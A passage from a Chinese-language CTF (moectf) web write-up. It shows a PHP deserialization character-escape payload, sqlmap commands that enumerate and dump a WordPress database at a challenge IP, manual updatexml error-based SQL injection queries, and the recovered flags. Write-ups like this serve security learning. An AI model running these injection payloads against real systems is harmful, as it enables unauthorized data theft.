class="hljs-string">&quot;夺命十三枪&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;Spear_Owner&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Nobody&quot;</span>;&#125;<br>Far away <span class="hljs-keyword">from</span> COOL...<br></code></pre></td></tr></table></figure><p>这里require_once中有一个可进入的php<br>先不管，往下看看到serialize和unserialize，这是一个反序列化类型题<br>再进入Hanxin.exe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deadly_Thirteen_Spears</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br>        <span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br>        <span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br>        <span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br>        <span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br>        <span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br>        <span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br>    );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Make_a_Move</span>(<span class="hljs-params"><span class="hljs-variable">$move</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>            <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Chant</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Spear_Owner</span> = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$chant</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Chant = <span class="hljs-variable">$chant</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Spear_Owner = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Spear_Owner !== <span class="hljs-string">&#x27;MaoLei&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Far away from COOL...&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>通过代码可知要让spear_Owner&#x3D;&#x3D;&#x3D;’Maolei’才能得到flag<br>而这个值为nobody，我们不可以直接改变。<br>再看上面的class</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>           <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>; <br></code></pre></td></tr></table></figure><p>foreach 语法结构提供了遍历数组的简单方式。foreach 循环只适用于数组，并用于遍历数组中的每个键&#x2F;值对.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$age</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Bill&quot;</span>=&gt;<span class="hljs-string">&quot;63&quot;</span>,<span class="hljs-string">&quot;Steve&quot;</span>=&gt;<span class="hljs-string">&quot;56&quot;</span>,<span class="hljs-string">&quot;Elon&quot;</span>=&gt;<span class="hljs-string">&quot;47&quot;</span>);<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$age</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span>=&gt;<span class="hljs-variable">$x_value</span>) &#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Key=&quot;</span> . <span class="hljs-variable">$x</span> . <span class="hljs-string">&quot;, Value=&quot;</span> . <span class="hljs-variable">$x_value</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;?<br>结果为：<br>Key=Bill, Value=<span class="hljs-number">63</span><br>Key=Steve, Value=<span class="hljs-number">56</span><br>Key=Elon, Value=<span class="hljs-number">47</span><br></code></pre></td></tr></table></figure><p>最重要的是这一语句</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$move</span> = str_replace(<span class="hljs-symbol">$i</span>ndex, <span class="hljs-symbol">$moveme</span>nt, <span class="hljs-symbol">$move</span>); <br></code></pre></td></tr></table></figure><p>看到str_replace和serialize就知道这是一个反序列化字符溢出漏洞<br>接下来着手构造<br>截取序列化字符</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">34</span>:<span class="hljs-string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Chant&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;夺命十三枪&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;Spear_Owner&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Nobody&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>截取<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</code>为35字符，我们要把这35个字符挤出<br>然后换为我们需要它的值<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br><span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br><span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br><span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br><span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br><span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br><span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br><span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br><span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br><span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br><span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br><span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br><span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br></code></pre></td></tr></table></figure><p>在这里面找一个前面比后面短的<br>以第一枪！！举例：<br>前比后少一<br>那么输出35遍前才能把35字符挤出(注：35遍后需要把我们改变的值加在后面)<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?chant=di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;C00L_b0Y!_AsgCuAg60YxVeSqKZqV8kZK1n-t-IlAA&#125;</span><br></code></pre></td></tr></table></figure><p>第七枪！！<br>前比后少5<br>输出7遍<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang<span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web-–出去旅游的心海"><a href="#web-–出去旅游的心海" class="headerlink" title="web –出去旅游的心海"></a>web –出去旅游的心海</h2><p>进入wordpress，F12找到一个php文件<br><img src="/images/OZRAX25D5V1EYGX3LVE.png"><br>进入找到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Visitor auto recorder</span><br><span class="hljs-comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span><br><span class="hljs-comment">Author: KoKoMi</span><br><span class="hljs-comment">  Still in development! :)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 不许偷看！这些代码我还在调试呢！</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 加载数据库配置，暂时用硬编码绝对路径</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="hljs-string">&#x27;wp-config.php&#x27;</span>);<br><br><span class="hljs-variable">$db_user</span> = DB_USER; <span class="hljs-comment">// 数据库用户名</span><br><span class="hljs-variable">$db_password</span> = DB_PASSWORD; <span class="hljs-comment">// 数据库密码</span><br><span class="hljs-variable">$db_name</span> = DB_NAME; <span class="hljs-comment">// 数据库名称</span><br><span class="hljs-variable">$db_host</span> = DB_HOST; <span class="hljs-comment">// 数据库主机</span><br><br><span class="hljs-comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><br><span class="hljs-comment">// 这些是临时的代码</span><br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$user_agent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;time&#x27;</span>]);<br><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_password</span>, <span class="hljs-variable">$db_name</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接失败: &#x27;</span> . <span class="hljs-variable">$mysqli</span>-&gt;connect_error;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="hljs-subst">$ip</span>&#x27;, &#x27;<span class="hljs-subst">$user_agent</span>&#x27;, <span class="hljs-subst">$time</span>)&quot;</span>;<br><br><span class="hljs-comment">// 执行插入</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>, <span class="hljs-variable">$query</span>);<br><br><span class="hljs-comment">// 检查插入是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入成功&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysqli</span>);<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$mysqli</span>);<br></code></pre></td></tr></table></figure><p>先附上一个<a href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap使用方法</a><br>根据末尾提示测试发现time存在报错注入，使用sqlmap</p><p><strong>查看数据库</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p>–data：通过POST提交数据<br>–dbs：枚举DBMS所有的数据库<br>–batch：测试过程中， 执行所有默认配置</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">available databases <span class="hljs-comment">[3]</span>:<br><span class="hljs-comment">[*]</span> information_schema<br><span class="hljs-comment">[*]</span> performance_schema<br><span class="hljs-comment">[*]</span> wordpress<br></code></pre></td></tr></table></figure><p><strong>查看数据库里面的表</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> -D wordpress <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p>–tables:枚举DBMS数据库中所有的表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-----------------------+<br>|<span class="hljs-string"> secret_of_kokomi      </span>|<br>|<span class="hljs-string"> visitor_records       </span>|<br>|<span class="hljs-string"> wp_commentmeta        </span>|<br>|<span class="hljs-string"> wp_comments           </span>|<br>|<span class="hljs-string"> wp_e_events           </span>|<br>|<span class="hljs-string"> wp_links              </span>|<br>|<span class="hljs-string"> wp_options            </span>|<br>|<span class="hljs-string"> wp_postmeta           </span>|<br>|<span class="hljs-string"> wp_posts              </span>|<br>|<span class="hljs-string"> wp_snippets           </span>|<br>|<span class="hljs-string"> wp_term_relationships </span>|<br>|<span class="hljs-string"> wp_term_taxonomy      </span>|<br>|<span class="hljs-string"> wp_termmeta           </span>|<br>|<span class="hljs-string"> wp_terms              </span>|<br>|<span class="hljs-string"> wp_usermeta           </span>|<br>|<span class="hljs-string"> wp_users              </span>|<br>+-----------------------+<br></code></pre></td></tr></table></figure><p><strong>查看数据库表里的列</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> -D wordpress -T secret_of_kokomi <span class="hljs-attr">--columns</span><br></code></pre></td></tr></table></figure><p>–columns :枚举DBMS数据库表中所有的列</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+---------+</span>------+<br><span class="hljs-section">| Column  | Type |</span><br><span class="hljs-section">+---------+------+</span><br>| content | text |<br><span class="hljs-section">| id      | int  |</span><br><span class="hljs-section">+---------+------+</span><br></code></pre></td></tr></table></figure><p><strong>查看数据库列里面的具体的值</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> -D wordpress -T secret_of_kokomi -C <span class="hljs-attribute">content</span> --dump<br></code></pre></td></tr></table></figure><p>–dump:存储DBMS数据库的表中的条目</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------------------------------------+</span><br><span class="hljs-section">| content                                            |</span><br><span class="hljs-section">+----------------------------------------------------+</span><br>| moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125; |<br>| paimengkanqilaihaohaochi                           |<br><span class="hljs-section">| woshishuimubushiyu~                                |</span><br><span class="hljs-section">+----------------------------------------------------+</span><br></code></pre></td></tr></table></figure><p><strong>手注sql</strong></p><p>通过<a href="https://blog.csdn.net/m0_62092622/article/details/122721621">updatexml</a>函数查询具体的数值</p><p>查询当前数据库的所有表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><br>//~secret_of_kokomi,visitor_record<br></code></pre></td></tr></table></figure><p>查询secret_of_kokomi表的字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;secret_of_kokomi&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><br>//<span class="hljs-string">&#x27;~content,id~</span><br></code></pre></td></tr></table></figure><p>查询数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,right(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(content,<span class="hljs-number">0x7e</span>,id) <span class="hljs-keyword">from</span> secret_of_kokomi)),<span class="hljs-number">60</span>),<span class="hljs-number">1</span>)<br><br>//moectf&#123;Dig_Thr0ugh_Eve2y_C0de<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;time=<span class="hljs-number">1</span> and updatexml(<span class="hljs-number">1</span>,right(concat(<span class="hljs-number">0</span>x7e,(select group_concat(content,<span class="hljs-number">0</span>x7e,id) from secret_of_kokomi)),<span class="hljs-number">30</span>),<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">y_C0de_3nd_Poss1bIlIti3s</span>!!&#125;<br></code></pre></td></tr></table></figure><p>将flag拼接即可</p><p>flag</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;<br></code></pre></td></tr></table></figure><h2 id="web–signin"><a href="#web–signin" class="headerlink" title="web–signin"></a>web–signin</h2><p>题目中有一个python文件,先代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 